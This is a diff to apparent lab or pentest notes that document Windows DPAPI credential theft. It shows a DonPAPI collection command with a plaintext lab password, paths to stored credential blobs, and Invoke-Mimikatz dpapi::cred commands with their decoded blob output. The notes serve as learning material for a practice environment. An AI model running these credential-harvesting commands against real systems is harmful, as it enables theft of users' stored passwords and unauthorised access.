@@ -49,3 +49,80 @@ donpapi collect -d north -u ROBB.STARK -p sexywolfy -t 192.168.56.11
 [192.168.56.11] [+] Dumping Wifi profiles
 DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
+
+### MimiKatz
+
+WinPeas:
+
+Encrypted files:
+
+![file:///tmp/.QWTCY2/1.png](file:///tmp/.QWTCY2/1.png)
+
+File location:
+
+```bash
+C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
+C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+```
+
+### Extract the Master key:
+
+```bash
+Get-ChildItem -Force C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
+```
+
+![[Pasted image 20241207184754.png]]
+
+
+First location:
+
+```bash
+Invoke-Mimikatz -command '"dpapi::cred /in:C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"'
+
+mimikatz(powershell) # dpapi::cred /in:C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {99cf41a3-a552-4cf7-a8d7-aca2d6f7339b}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+```
+
+Master Key: `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`
+
+Second location:
+
+```bash
+Invoke-Mimikatz -command '"dpapi::cred /in:C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"'
+
+mimikatz(powershell) # dpapi::cred /in:C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {99cf41a3-a552-4cf7-a8d7-aca2d6f7339b}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000030 - 48
+  szDescription      : Local Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 586c18f719809aa13da9974b6a8c37c0
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : c03adc671023481d60b1c89b10984e51
+  dwDataLen          : 00002a48 - 10824
+  pbData             : 9da1476ab9fd16f8200b3f717480c606f<-SNIP->
+```
+
+Master Key: `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`
+
+
+
+
